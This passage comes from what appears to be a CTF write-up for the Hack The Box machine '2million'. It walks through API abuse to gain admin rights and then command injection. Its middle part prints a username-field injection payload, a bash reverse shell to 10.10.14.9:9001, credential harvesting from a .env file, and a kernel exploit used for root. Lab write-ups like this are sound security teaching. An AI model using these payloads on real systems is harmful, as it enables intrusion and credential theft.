+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>8215/8215<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">306</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:27<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><h4 id="infostxt">Infos.txt</h4>
+<ul>
+<li>Add the host name to <code>etc/hosts</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>parallels㉿kali-gnu-linux-2023<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -I http://10.10.11.221                                                                                                                                                       
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">301</span> Moved Permanently
+</span></span><span style="display:flex;"><span>Server: nginx
+</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">14</span> Feb <span style="color:#ae81ff">2024</span> 21:16:33 GMT
+</span></span><span style="display:flex;"><span>Content-Type: text/html
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">162</span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>Location: http://2million.htb/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                            
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>parallels㉿kali-gnu-linux-2023<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;10.10.11.221 2million.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span><span style="display:flex;"><span>10.10.11.221 2million.htb
+</span></span></code></pre></div><ul>
+<li>Looking at the cookie, this site can be a PHP app. ( PHPSESSID )</li>
+<li>Verify the javascript code.. we can find another routes</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/e78edb35d1760bc774302a4e49fef429.png" alt=""></p>
+<ul>
+<li>Some data are encrypted
+<img src="/markdown-export-output-attachments/027cc7cb732e889193823f534672bc5e.png" alt=""></li>
+<li>With the following python script we can decrypt the text</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_rot13</span>(text):
+</span></span><span style="display:flex;"><span>    decrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> text:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">&lt;=</span> char <span style="color:#f92672">&lt;=</span> <span style="color:#e6db74">&#39;z&#39;</span>:
+</span></span><span style="display:flex;"><span>            decrypted_text <span style="color:#f92672">+=</span> chr((ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">13</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">&lt;=</span> char <span style="color:#f92672">&lt;=</span> <span style="color:#e6db74">&#39;Z&#39;</span>:
+</span></span><span style="display:flex;"><span>            decrypted_text <span style="color:#f92672">+=</span> chr((ord(char) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">13</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            decrypted_text <span style="color:#f92672">+=</span> char
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decrypted_text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&#34;</span>
+</span></span><span style="display:flex;"><span>decrypted_text <span style="color:#f92672">=</span> decrypt_rot13(encrypted_text)
+</span></span><span style="display:flex;"><span>print(decrypted_text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In order to generate the invite code, make a POST request to /api/v1/invite/generate</span>
+</span></span></code></pre></div><ul>
+<li>Generate the invite</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/a4dbcf5cb4584056fc481cb25b7ea220.png" alt="">
+<img src="/markdown-export-output-attachments/c84f984236161bcf21cf5fb0d51fadfc.png" alt=""></p>
+<ul>
+<li>Login with the created user</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/ce9cdf64ad01d6455fb5dd06e04824f5.png" alt=""></p>
+<ul>
+<li>Verify the docs of the <code>api</code></li>
+</ul>
+<p><img src="/markdown-export-output-attachments/8a10a7bc031ed59dce4fda5513f0f5b3.png" alt=""></p>
+<ul>
+<li>Update your user as admin</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/d31b294ac06e2b75325fb0ee5729031a.png" alt="">
+<img src="/markdown-export-output-attachments/28287f8fa52455101f2820e0a975bb49.png" alt=""></p>
+<ul>
+<li>Generate the config file..</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/0d4c51069ed883cd707412d5ee227f6a.png" alt=""></p>
+<blockquote>
+<p>Based on the output we can figure out, that this probably have some <code>bash</code> running at the <code>backend</code></p>
+</blockquote>
+<blockquote>
+<p>Command injection</p>
+</blockquote>
+<p><img src="/markdown-export-output-attachments/63a25e8fb5448a647479285ad0c12dce.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;sysevil; w #&#34;</span>}
+</span></span></code></pre></div><blockquote>
+<p>Reverse shell as www-data</p>
+</blockquote>
+<p><img src="/markdown-export-output-attachments/b703818410e0cbcb08e00433788093ba.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;sysevil; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.9/9001 0&gt;&amp;1&#39; #&#34;</span>}
+</span></span></code></pre></div><h4 id="usertxt">user.txt</h4>
+<ul>
+<li>After getting a shell. Search for credentials and verify the <code>.env</code> file. This file contain the <code>admin</code> credentials.
+<img src="/markdown-export-output-attachments/01935098aaffc289fe1cea9fe4c81fb3.png" alt=""></li>
+</ul>
+<p><img src="/markdown-export-output-attachments/19750ec7b094c4110afcbb391b26f499.png" alt=""></p>
+<h4 id="roottxt">root.txt</h4>
+<ul>
+<li>The machine not have any <code>sudo</code> bins running</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/e2969fe129872ee4799e83b12f287294.png" alt=""></p>
+<blockquote>
+<p>But we have the version of the ubuntu, and we can search for exploits..</p>
+</blockquote>
+<ul>
+<li>Transfer the files to the machine..</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/933cec7a37211f192a754027d05c552c.png" alt=""></p>
+<ul>
+<li>Compile.. with <code>make all</code> command.. and run</li>
+</ul>
+<p><img src="/markdown-export-output-attachments/f1742e7bc9f6fc1a991dcff714cc2602.png" alt=""></p>
+<ul>
+<li>Open another SSH connection and at the same dir <code>./exp</code> .. and you are <code>root</code></li>
+</ul>
+<p><img src="/markdown-export-output-attachments/720f3e6543c23ce4cc055a98ad202a76.png" alt=""></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://sysevil.github.io/htb/devvortex/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Devvortex</a>
+        
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
